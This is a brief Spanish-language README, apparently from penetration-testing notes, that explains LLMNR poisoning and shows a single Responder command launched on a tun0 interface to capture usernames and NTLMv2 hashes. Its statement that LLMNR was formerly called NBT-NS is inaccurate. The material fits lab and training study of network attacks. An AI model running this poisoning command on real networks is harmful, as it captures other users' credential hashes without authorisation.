# Qué es LLMNR?

- Se usa para identificat hosts cuando el DNS falla.
- Antes se conocía como `NBT-NS`
- El servicio utiliza el `username` de un usuario y un `Hash NTLMv2` cuando responde.

# Explicación gráfica del vector de ataque

[Click aqui para ver la imagen](Images/main/README.md)

# Iniciando Ataque (Responder)

```
python /usr/share/responder.py -I tun0 -rdw
```

[Click aqui para ver el ataque en proceso](Images/Responder/README.md)
